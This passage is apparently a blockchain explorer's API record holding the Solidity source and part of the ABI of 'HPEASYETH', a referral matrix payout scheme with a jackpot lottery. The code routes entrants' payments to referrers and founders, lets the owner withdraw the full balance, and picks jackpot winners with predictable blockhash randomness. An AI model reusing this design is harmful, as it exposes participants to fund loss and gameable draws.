{"status":"1","message":"OK","result":[{"SourceCode":"// SPDX-License-Identifier: None\r\n\r\npragma solidity ^0.6.12;\r\n\r\nabstract contract ERC20  {\r\n    function transfer(address to, uint tokens) virtual public returns (bool success);\r\n}\r\n\r\ncontract Owned {\r\n    address public owner;\r\n    address public newOwner;\r\n\r\n    event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n    constructor(address ownerAddress) public {\r\n        owner = ownerAddress;\r\n    }\r\n\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address _newOwner) public onlyOwner {\r\n        newOwner = _newOwner;\r\n    }\r\n\r\n    function acceptOwnership() public { \r\n        require(msg.sender == newOwner);\r\n        emit OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n        newOwner = address(0);\r\n    }\r\n}\r\n\r\ncontract HPEASYETH is Owned {\r\n    struct User {\r\n        uint id;\r\n        address referrer;\r\n        uint matrices_cnt;\r\n        uint current_matrix;\r\n        uint last_matrix;\r\n        uint hpeasy_cooldown_time;\r\n        uint hpeasy_cooldown_num;\r\n        uint direct_referrals;\r\n    }\r\n\r\n    struct Matrix {\r\n        uint id;\r\n        address owner;\r\n        uint referrals_cnt;\r\n        mapping(uint => uint) referrals;\r\n        uint matrix_referrer;\r\n        address direct_referrer;\r\n        uint from_hpeasy;\r\n        uint cycles;\r\n        uint bunch_cycles;\r\n    }\r\n\r\n    struct HpEasyLine {\r\n        address owner;\r\n        uint matrix_id;\r\n    }\r\n\r\n    struct PaymentStatus { \r\n        bool is_eth_paid; \r\n        bool is_tokens_paid; \r\n        uint matrix_to_renew;\r\n        address referrer;\r\n    }\r\n\r\n    struct JackpotPaymentStatus { \r\n        bool is_eth_paid; \r\n        bool is_tokens_paid; \r\n        uint line;\r\n        uint bet_size; \r\n    }\r\n\r\n    string public name = \"HPEASY ETH\";\r\n    uint public regCost;\r\n    address public tokenAddress;\r\n    uint public lastUserId = 1;\r\n    uint public lastMatrixId = 1;\r\n    uint public lastHpEasyId = 1;\r\n    bool public useTokenPayment = true;\r\n\r\n    uint public skippedHpEasysOffset;\r\n    uint public bunchCyclesLimit; \r\n    \r\n    address[] private founders;  \r\n    uint private seed = 1;\r\n\r\n    mapping(address => User) public users;\r\n    mapping(uint => address) public usersById;\r\n    mapping(uint => Matrix) public matrices;\r\n    mapping(uint => mapping(uint => uint)) public usersMatrices;\r\n    mapping(uint => HpEasyLine) public HpEasy;\r\n    mapping (address => PaymentStatus) public paymentQueue; \r\n\r\n    mapping(uint => mapping(uint => address[])) private bets; \r\n    mapping (address => JackpotPaymentStatus) public jackpotQueue; \r\n\r\n    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);\r\n    event Transfer(address indexed user, uint indexed userId, uint indexed amount); \r\n    event SkipMatrix(uint matrixId);\r\n    event ChangeUseTokenPayment(bool useTokenPayment); \r\n    event ChangeRegistrationCost(uint newCost); \r\n    event ChangeTokenAddress(address newTokenAddress);\r\n    event ChangeBunchCyclesLimit(uint newCoolDown);\r\n    event NewJackpotWinner(uint line, uint betSize, uint jackpot, address winnerAddress); \r\n\r\n\r\n\r\n\r\n    constructor(address ownerAddress, address _tokenAddress, address[] memory _founders) Owned (ownerAddress) public {\r\n        founders = _founders;\r\n        tokenAddress = _tokenAddress;\r\n\r\n        users[ownerAddress] = User({\r\n            id: lastUserId,\r\n            referrer: address(0),\r\n            matrices_cnt: 0,\r\n            current_matrix: 0,\r\n            last_matrix: 0,\r\n            hpeasy_cooldown_time: 0,\r\n            hpeasy_cooldown_num: 0,\r\n            direct_referrals: 0\r\n            });\r\n\r\n        usersById[lastUserId] = ownerAddress;\r\n\r\n        matrices[lastMatrixId] = Matrix({\r\n            id: lastUserId,\r\n            owner: ownerAddress,\r\n            referrals_cnt: 0,\r\n            matrix_referrer: 0,\r\n            direct_referrer: address(0),\r\n            from_hpeasy: 0,\r\n            cycles: 0,\r\n            bunch_cycles: 0\r\n            });\r\n\r\n        usersMatrices[users[ownerAddress].id][users[ownerAddress].matrices_cnt] = lastMatrixId;\r\n        users[ownerAddress].matrices_cnt++;\r\n        users[ownerAddress].current_matrix = 0;\r\n\r\n        HpEasy[lastHpEasyId] = HpEasyLine({\r\n            matrix_id: lastMatrixId,\r\n            owner: ownerAddress\r\n            });\r\n\r\n        lastHpEasyId++;\r\n        lastMatrixId++;\r\n        lastUserId++;\r\n\r\n        regCost = 0.05 ether;\r\n        bunchCyclesLimit = 6; \r\n    }\r\n\r\n    function isUserExists(address user) public view returns (bool) {\r\n        return (users[user].id != 0);\r\n    }\r\n\r\n    function matrixReferrals(uint matrixId, uint index) public view returns (uint) {\r\n        return matrices[matrixId].referrals[index];\r\n    }\r\n\r\n          \r\n    \r\n\r\n    function changeUseTokenPayment() public  onlyOwner returns (bool success) {\r\n        useTokenPayment = !useTokenPayment;\r\n        emit ChangeUseTokenPayment(useTokenPayment);\r\n        return true;\r\n    }\r\n    \r\n    function changeRegistrationCost(uint newCost) public  onlyOwner returns (bool success) {\r\n        regCost = newCost;\r\n        emit ChangeRegistrationCost(newCost);\r\n        return true;\r\n    }\r\n    \r\n    function changeTokenAddress (address newTokenAddress) public onlyOwner returns (bool success) {\r\n        tokenAddress = newTokenAddress;\r\n        emit ChangeTokenAddress(newTokenAddress);\r\n        return true;\r\n    }\r\n\r\n    function changeBunchCyclesLimit (uint newLimit) public onlyOwner returns (bool success) { \r\n        require (newLimit > 0, \"the value must be greater than 0\");\r\n        bunchCyclesLimit = newLimit;\r\n        emit ChangeBunchCyclesLimit(newLimit);\r\n        return true;\r\n    }\r\n\r\n    function transferFunds(address to, uint amount) public onlyOwner returns (bool success) {\r\n        require (amount <= address(this).balance, \"Not enough funds\");\r\n        address(uint160(to)).transfer(amount);\r\n        return true;\r\n    }\r\n\r\n\r\n\r\n\r\n    function receiveTransfer(address from, uint tokens, bytes memory data) public returns (string memory status) {\r\n        require(msg.sender == tokenAddress, \"Unknown token\");\r\n\r\n        string memory result;\r\n        if (data.length == 0) { //registration, purchase or renew cost\r\n            require(tokens == regCost, \"Wrong token amount\");\r\n            require(!paymentQueue[from].is_tokens_paid, \"tokens paid, ETH awaiting\");\r\n\r\n            if (!isUserExists(from)) {\r\n                if (!paymentQueue[from].is_eth_paid) {\r\n                    paymentQueue[from].is_tokens_paid = true;\r\n                    result = \"Tokens accepted. Waiting ETH payment for registration completion\";\r\n                } else {\r\n                    paymentQueue[from].is_eth_paid = false;\r\n                    registration(from, paymentQueue[from].referrer);\r\n                    result = \"Registration is completed\";\r\n                }\r\n            } else {\r\n                require(users[from].matrices_cnt < 150 || paymentQueue[from].matrix_to_renew != 0, \"max 150 hpeasy allowed\");\r\n\r\n                if (!paymentQueue[from].is_eth_paid) {\r\n                    paymentQueue[from].is_tokens_paid = true;\r\n                    result = \"Tokens accepted. Waiting ETH payment for HpEasy purchase/renew\";\r\n                } else {\r\n                    paymentQueue[from].is_eth_paid = false;\r\n                    if (paymentQueue[from].matrix_to_renew != 0) {\r\n                        renew(from, paymentQueue[from].matrix_to_renew);\r\n                        paymentQueue[from].matrix_to_renew = 0;\r\n                        result = \"Renew is completed\";\r\n                    } else {\r\n                        purchase(from);\r\n                        result = \"Purchase is completed\";\r\n                    }\r\n                }\r\n            }\r\n        } else { //jackpot \r\n            require(!jackpotQueue[from].is_tokens_paid, \"already paid jackpot cost in tokens, ETH awaiting\");\r\n            \r\n            uint line = deserializeUint32(data);\r\n\r\n            if (!jackpotQueue[from].is_eth_paid) {\r\n                require(tokens == 0.001 ether || tokens == 0.005 ether || tokens == 0.015 ether || tokens == 0.05 ether || tokens == 0.15 ether || tokens == 0.5 ether, \"No such bet size\"); \r\n                require(line == 10 || line == 50 || line == 200 || line == 500, \"No such bet line\"); \r\n                jackpotQueue[from].is_tokens_paid = true;\r\n                jackpotQueue[from].line = line;\r\n                jackpotQueue[from].bet_size = tokens;\r\n                result = \"Waiting ETH payment for jackpot bet acceptance\";\r\n            } else {\r\n                require(jackpotQueue[from].line == line && jackpotQueue[from].bet_size == tokens, \"wrong line or bet size\");\r\n                result = addJackpotBet(jackpotQueue[from].line, jackpotQueue[from].bet_size);\r\n                delete jackpotQueue[from];\r\n            }\r\n        }\r\n\r\n        return result;\r\n    }     \r\n\r\n    function register(address referrer) public payable {\r\n        require(msg.value == regCost, \"not correct registration cost\");\r\n        require(!isUserExists(msg.sender), \"user exists\");\r\n        require(isUserExists(referrer), \"referrer not exists\");\r\n        require(!paymentQueue[msg.sender].is_eth_paid, \"already paid registration cost in ETH, tokens awaiting\");\r\n        \r\n        if (!useTokenPayment) {\r\n            registration(msg.sender, referrer);\r\n        } else if (!paymentQueue[msg.sender].is_tokens_paid) {\r\n            paymentQueue[msg.sender].is_eth_paid = true;\r\n            paymentQueue[msg.sender].referrer = referrer;\r\n        } else {\r\n            paymentQueue[msg.sender].is_tokens_paid = false;\r\n            registration(msg.sender, referrer);\r\n        }\r\n    }\r\n\r\n    function purchaseHpEasyPosition() public payable {\r\n        require(msg.value == regCost, \"not correct purchase cost\"); \r\n        require(isUserExists(msg.sender), \"user not exists\");\r\n        require(users[msg.sender].matrices_cnt < 150, \"max 150 hpeasy allowed\");\r\n        require(!paymentQueue[msg.sender].is_eth_paid, \"already paid in ETH, tokens awaiting\");\r\n\r\n        if (!useTokenPayment) {\r\n            purchase(msg.sender);\r\n        } else if(!paymentQueue[msg.sender].is_tokens_paid) {\r\n            paymentQueue[msg.sender].is_eth_paid = true;\r\n        } else {\r\n            paymentQueue[msg.sender].is_tokens_paid = false;\r\n            purchase(msg.sender);\r\n        }\r\n    }\r\n    \r\n    function renewMatrix(uint matrixToRenew) public payable {\r\n        require(msg.value == regCost, \"not correct renew cost\"); \r\n        require(matrices[matrixToRenew].bunch_cycles >= bunchCyclesLimit, \"matrix is active\");\r\n        require(isUserExists(msg.sender), \"user not exists\");\r\n        require(!paymentQueue[msg.sender].is_eth_paid, \"already paid in ETH, token payment awaiting\");\r\n        require(matrices[matrixToRenew].owner == msg.sender, \"not user's matrix\");\r\n\r\n        if (!useTokenPayment) { \r\n            renew(msg.sender, matrixToRenew);\r\n        } else if(!paymentQueue[msg.sender].is_tokens_paid) {\r\n            paymentQueue[msg.sender].is_eth_paid = true;\r\n            paymentQueue[msg.sender].matrix_to_renew = matrixToRenew;\r\n        } else {\r\n            paymentQueue[msg.sender].is_tokens_paid = false;\r\n            renew(msg.sender, matrixToRenew);\r\n        }\r\n    }\r\n\r\n\r\n\r\n\r\n    function registration(address userAddress, address referrerAddress) private {\r\n        users[userAddress] = User({\r\n            id: lastUserId,\r\n            referrer: referrerAddress,\r\n            matrices_cnt: 0,\r\n            current_matrix: 0,\r\n            last_matrix: 0,\r\n            hpeasy_cooldown_time: 0,\r\n            hpeasy_cooldown_num: 0,\r\n            direct_referrals: 0\r\n            });\r\n\r\n        usersById[lastUserId] = userAddress;\r\n\r\n        lastUserId++;\r\n\r\n        users[referrerAddress].direct_referrals++;\r\n\r\n        payUser(referrerAddress, regCost * 10 / 100); \r\n        payFounders(regCost * 10 / 100); \r\n        joinHpEasy(lastMatrixId, userAddress, false);\r\n        fillMatrix(userAddress, referrerAddress, 0);\r\n        \r\n        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);\r\n    }\r\n\r\n    function purchase(address userAddress) private  {\r\n        if (users[userAddress].hpeasy_cooldown_time < now - 86400) {\r\n            users[userAddress].hpeasy_cooldown_time = now;\r\n            users[userAddress].hpeasy_cooldown_num = 1;\r\n        } else {\r\n            if (users[userAddress].hpeasy_cooldown_num < 3) {\r\n                users[userAddress].hpeasy_cooldown_num++;\r\n            } else {\r\n                revert(\"24h purchase limit\");\r\n            }\r\n        }\r\n\r\n        payUser(users[userAddress].referrer, regCost * 10 / 100); \r\n        payFounders(regCost * 10 / 100); \r\n        joinHpEasy(lastMatrixId, userAddress, false); \r\n        fillMatrix(userAddress, users[userAddress].referrer, 1);\r\n    }\r\n\r\n    function renew(address userAddress, uint matrixToRenew) private  {\r\n        payUser(users[userAddress].referrer, regCost * 10 / 100); \r\n        payFounders(regCost * 10 / 100); \r\n        joinHpEasy(matrixToRenew, userAddress, true); \r\n        payForMatrix(matrices[matrixToRenew].matrix_referrer);\r\n    }\r\n\r\n    function joinHpEasy(uint matrixId, address matrixOwner, bool isRenew) private {\r\n        HpEasy[lastHpEasyId] = HpEasyLine({\r\n            matrix_id: matrixId,\r\n            owner: matrixOwner\r\n            });\r\n        lastHpEasyId++;\r\n\r\n        if (matrices[matrixId].id != 0) {\r\n            if (isRenew) {\r\n                matrices[matrixId].bunch_cycles = 0; \r\n            } else {\r\n                matrices[matrixId].cycles++;\r\n                matrices[matrixId].bunch_cycles++; \r\n            }\r\n        }\r\n        \r\n        if (lastHpEasyId % 2 == 0) {\r\n            if (lastHpEasyId > 2) {\r\n                uint currentHp = skippedHpEasysOffset + lastHpEasyId / 2 - 1;\r\n                \r\n                while (matrices[HpEasy[currentHp].matrix_id].bunch_cycles >= bunchCyclesLimit\r\n                        && (lastHpEasyId / 2 + skippedHpEasysOffset < lastHpEasyId - 2)) { \r\n                    emit SkipMatrix(HpEasy[currentHp].matrix_id);\r\n                    skippedHpEasysOffset++;\r\n                    currentHp++;\r\n                }\r\n\r\n                payHpEasy(HpEasy[currentHp].owner);\r\n                joinHpEasy(HpEasy[currentHp].matrix_id, HpEasy[currentHp].owner, false);\r\n                payForMatrix(matrices[HpEasy[currentHp].matrix_id].matrix_referrer);\r\n            } else {\r\n                payHpEasy(owner);\r\n                payForMatrix(0);\r\n            }\r\n        }\r\n    }\r\n\r\n    function payForMatrix(uint slotId) private {\r\n        if (slotId == 0) {\r\n            payUser(matrices[1].owner, regCost * 25 / 100); \r\n            return;\r\n        }\r\n\r\n        uint unspent = 0;\r\n        address lastEligible;\r\n        uint level1 = slotId;\r\n\r\n        if (users[matrices[level1].owner].direct_referrals < 4 || matrices[level1].bunch_cycles >= bunchCyclesLimit) { \r\n            unspent = regCost * 25 / 1000;\r\n        } else {\r\n            payUser(matrices[level1].owner, regCost * 25 / 1000);\r\n            lastEligible = matrices[level1].owner;\r\n        }\r\n\r\n        uint level2 = matrices[level1].matrix_referrer;\r\n\r\n        if (level2 == 0) {\r\n            if (lastEligible != address(0)) {\r\n                payUser(lastEligible, regCost * 225 / 1000); \r\n            } else {\r\n                payUser(matrices[1].owner, regCost * 25 / 100); \r\n            }\r\n            return;\r\n        } else if (users[matrices[level2].owner].direct_referrals < 4 || matrices[level2].bunch_cycles >= bunchCyclesLimit) { \r\n            unspent += regCost * 5 / 100;\r\n        } else {\r\n            payUser(matrices[level2].owner, unspent + regCost * 5 / 100);\r\n            lastEligible = matrices[level2].owner;\r\n            unspent = 0;\r\n        }\r\n\r\n        uint level3 = matrices[level2].matrix_referrer;\r\n\r\n        if (level3 == 0) {\r\n            if (lastEligible != address(0)) {\r\n                payUser(lastEligible, regCost * 175 / 1000 + unspent); \r\n            } else {\r\n                payUser(matrices[1].owner, regCost * 25 / 100); \r\n            }\r\n            return;\r\n        } else if (users[matrices[level3].owner].direct_referrals < 4 || matrices[level3].bunch_cycles >= bunchCyclesLimit) { \r\n            unspent += regCost * 75 / 1000;\r\n        } else {\r\n            payUser(matrices[level3].owner, unspent + regCost * 75 / 1000);\r\n            lastEligible = matrices[level3].owner;\r\n            unspent = 0;\r\n        }\r\n\r\n        uint level4 = matrices[level3].matrix_referrer;\r\n\r\n        if (level4 == 0) {\r\n            if (lastEligible != address(0)) {\r\n                payUser(lastEligible, regCost * 10 / 100 + unspent); \r\n            } else {\r\n                payUser(matrices[1].owner, regCost * 25 / 100); \r\n            }\r\n            return;\r\n        } else if (users[matrices[level4].owner].direct_referrals < 4 || matrices[level4].bunch_cycles >= bunchCyclesLimit) { \r\n            unspent += regCost * 10 / 100;\r\n        } else {\r\n            payUser(matrices[level4].owner, unspent + regCost * 10 / 100);\r\n            lastEligible = matrices[level4].owner;\r\n            unspent = 0;\r\n        }\r\n\r\n        if (unspent == regCost * 25 / 100) {\r\n            while (users[matrices[level4].owner].direct_referrals < 4 || matrices[level4].bunch_cycles >= bunchCyclesLimit) {\r\n                if (level4 == 0) {\r\n                    payUser(matrices[1].owner, unspent);\r\n                    return;\r\n                }\r\n\r\n                level4 = matrices[level4].matrix_referrer;\r\n            }\r\n\r\n            payUser(matrices[level4].owner, unspent);\r\n        } else if (unspent != 0) {\r\n            payUser(lastEligible, unspent);\r\n        }\r\n    }\r\n\r\n    function fillMatrix(address user, address referrer, uint from_hpeasy) private {\r\n        if (referrer == address(0)) {\r\n            referrer = usersById[1];\r\n        }\r\n\r\n        uint slotId = findSlot(usersMatrices[users[referrer].id][users[referrer].current_matrix], 1, 4);\r\n\r\n        if (slotId == 0) {\r\n            if (users[referrer].current_matrix == users[referrer].matrices_cnt-1) {\r\n                revert(\"all matrices are full\");\r\n            }\r\n\r\n            users[referrer].current_matrix++;\r\n            slotId = findSlot(usersMatrices[users[referrer].id][users[referrer].current_matrix], 1, 4);\r\n        }\r\n\r\n        payForMatrix(slotId);\r\n\r\n        matrices[lastMatrixId] = Matrix({\r\n            id: lastMatrixId,\r\n            owner: user,\r\n            referrals_cnt: 0,\r\n            matrix_referrer: slotId,\r\n            from_hpeasy: from_hpeasy,\r\n            direct_referrer: referrer,\r\n            cycles: 0,\r\n            bunch_cycles: 0\r\n            });\r\n\r\n        usersMatrices[users[user].id][users[user].matrices_cnt] = lastMatrixId;\r\n        users[user].matrices_cnt++;\r\n        users[user].last_matrix = lastMatrixId;\r\n\r\n        matrices[lastMatrixId].matrix_referrer = slotId;\r\n\r\n        lastMatrixId++;\r\n\r\n        matrices[slotId].referrals[matrices[slotId].referrals_cnt] = lastMatrixId-1;\r\n        matrices[slotId].referrals_cnt++;\r\n    }\r\n\r\n    function findSlot(uint matrix, uint level, uint maxLevel) private returns (uint) {\r\n        if (level > maxLevel) {\r\n            return(0);\r\n        }\r\n\r\n        if (matrices[matrix].referrals_cnt < 4) {\r\n            return(matrix);\r\n        }\r\n\r\n        uint tmpMaxLevel = level+1;\r\n\r\n        while (tmpMaxLevel <= maxLevel) {\r\n            uint i=0;\r\n\r\n            do {\r\n                uint slot = findSlot(matrices[matrix].referrals[i], level+1, tmpMaxLevel);\r\n                if (slot != 0) {\r\n                    return(slot);\r\n                }\r\n\r\n                i++;\r\n            } while (i<4);\r\n\r\n            tmpMaxLevel++;\r\n        }\r\n\r\n        return(0);\r\n    }\r\n\r\n    function payUser(address user, uint amount) private {\r\n        emit Transfer(user, users[user].id, amount);\r\n        address(uint160(user)).transfer(amount);\r\n        if (useTokenPayment) {\r\n            require(payInTokens(user, amount));\r\n        }\r\n    }\r\n\r\n    function payHpEasy(address user) private {\r\n        emit Transfer(user, users[user].id, regCost * 30 / 100);\r\n        address(uint160(user)).transfer(regCost * 30 / 100);\r\n        if (useTokenPayment) {\r\n            require(payInTokens(user, regCost * 30 / 100)); \r\n        }\r\n    }\r\n\r\n    function payFounders(uint amount) private {\r\n        uint founderAmount;\r\n\r\n\t\tfor (uint i=0; i < founders.length; i++) {\r\n\t\t\tif (i < 4 ) {\r\n                founderAmount = amount * 20 / 100;\r\n            } else {\r\n                founderAmount = amount * 5 / 100;\r\n            }\r\n            emit Transfer(founders[i], 0, founderAmount);\r\n            address(uint160(founders[i])).transfer(founderAmount);\r\n            if (useTokenPayment) { \r\n                payInTokens(founders[i], founderAmount);\r\n            }\r\n\t\t}\r\n    }\r\n\r\n    function payInTokens(address to, uint amount) private returns (bool success) {\r\n        return ERC20(tokenAddress).transfer(to, amount);\r\n    }\r\n\r\n\r\n\r\n    \r\n    function joinJackpot(uint line) public payable returns(string memory status) {\r\n        require(!jackpotQueue[msg.sender].is_eth_paid, \"already paid ETH, tokens awaiting\");\r\n        \r\n        string memory result;\r\n        if (!useTokenPayment) {\r\n            result = addJackpotBet(line, msg.value);\r\n        } else if (!jackpotQueue[msg.sender].is_tokens_paid) {\r\n            require(msg.value == 0.001 ether || msg.value == 0.005 ether || msg.value == 0.015 ether || msg.value == 0.05 ether || msg.value == 0.15 ether || msg.value == 0.5 ether, \"No such bet size\"); \r\n            require(line == 10 || line == 50 || line == 200 || line == 500, \"No such bet line\");  \r\n            jackpotQueue[msg.sender].line = line;\r\n            jackpotQueue[msg.sender].is_eth_paid = true;\r\n            jackpotQueue[msg.sender].bet_size = msg.value;\r\n            result = \"Waiting token payment for jackpot bet acceptance\";\r\n        } else {\r\n            require(jackpotQueue[msg.sender].line == line && jackpotQueue[msg.sender].bet_size == msg.value, \"wrong line or bet size\");\r\n            result = addJackpotBet(jackpotQueue[msg.sender].line, jackpotQueue[msg.sender].bet_size);\r\n            delete jackpotQueue[msg.sender];\r\n        }\r\n\r\n        return result;\r\n    }\r\n\r\n    function addJackpotBet(uint line, uint betSize) private returns(string memory status) {\r\n        bets[line][betSize].push(msg.sender);\r\n        \r\n        if (bets[line][betSize].length == line) { \r\n            defineWinner(line);\r\n            return (\"This line winner is defined\");\r\n        } else {\r\n            return (\"Your bet is accepted\");\r\n        }\r\n    }\r\n    \r\n    function betsLineFilling(uint line, uint betSize) public view returns (uint length) { \r\n        return bets[line][betSize].length;\r\n    }\r\n\r\n    function betsLineAddresses(uint line, uint betSize) public view returns (address[] memory participants) { \r\n        return bets[line][betSize];\r\n    }\r\n\r\n    function defineWinner(uint line) private {  \r\n        uint additionalSeed = uint(blockhash(block.number - 1)); \r\n        uint rnd = 0;\r\n        \r\n        while(rnd < line) { \r\n            rnd += additionalSeed * seed;\r\n        }\r\n        \r\n        address winnerAddress = bets[line][msg.value][rnd % line];\r\n        uint winnerAmount = line * msg.value * 9 / 10;\r\n        uint transactionalCost = line * msg.value / 10;\r\n        \r\n        address(uint160(winnerAddress)).transfer(winnerAmount);\r\n        payInTokens(winnerAddress, winnerAmount);\r\n        emit NewJackpotWinner(line, msg.value, winnerAmount, winnerAddress);\r\n\r\n        payFounders(transactionalCost);\r\n\r\n        delete bets[line][msg.value]; \r\n\r\n        seed = additionalSeed;\r\n    }\r\n\r\n    function deserializeUint32(bytes memory data) private pure returns (uint)\r\n    {\r\n        uint32 res = 0;\r\n\r\n        for (uint i = 0; i < 4; i++)\r\n        {\r\n            uint32 temp = uint32(uint8(data[i]));\r\n            temp <<= 8 * i;\r\n            res ^= temp;\r\n        }\r\n\r\n        return uint(res);\r\n    }\r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ownerAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_tokenAddress\",\"type\":\"address\"},{\"internalType\":\"address[]\",\"name\":\"_founders\",\"type\":\"address[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newCoolDown\",\"type\":\"uint256\"}],\"name\":\"ChangeBunchCyclesLimit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newCost\",\"type\":\"uint256\"}],\"name\":\"ChangeRegistrationCost\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"newTokenAddress\",\"type\":\"address\"}],\"name\":\"ChangeTokenAddress\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"useTokenPayment\",\"type\":\"bool\"}],\"name\":\"ChangeUseTokenPayment\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"line\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"betSize\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"jackpot\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"winnerAddress\",\"type\":\"address\"}],\"name\":\"NewJackpotWinner\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"userId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"referrerId\",\"type\":\"uint256\"}],\"name\":\"Registration\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"matrixId\",\"type\":\"uint256\"}],\"name\":\"SkipMatrix\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"userId\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"HpEasy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"matrix_id\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"acceptOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"line\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"betSize\",\"type\":\"uint256\"}],\"name\":\"betsLineAddresses\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"participants\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"line\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"betSize\",\"type\":\"uint256\"}],\"name\":\"betsLineFilling\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"length\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bunchCyclesLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newLimit\",\"type\":\"uint256\"}],\"name\":\"changeBunchCyclesLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newCost\",\"type\":\"uint256\"}],\"name\":\"changeRegistrationCost\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newTokenAddress\",\"type\":\"address\"}],\"name\":\"changeTokenAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"changeUseTokenPayment\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isUserExists\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"jackpotQueue\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"is_eth_paid\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"is_tokens_paid\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"line\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"bet_size\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"line\",\"type\":\"uint256\"}],\"name\":\"joinJackpot\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"status\",\"type\":\"string\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastHpEasyId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastMatrixId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"matrices\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"referrals_cnt\",\"type\":\"uint256\"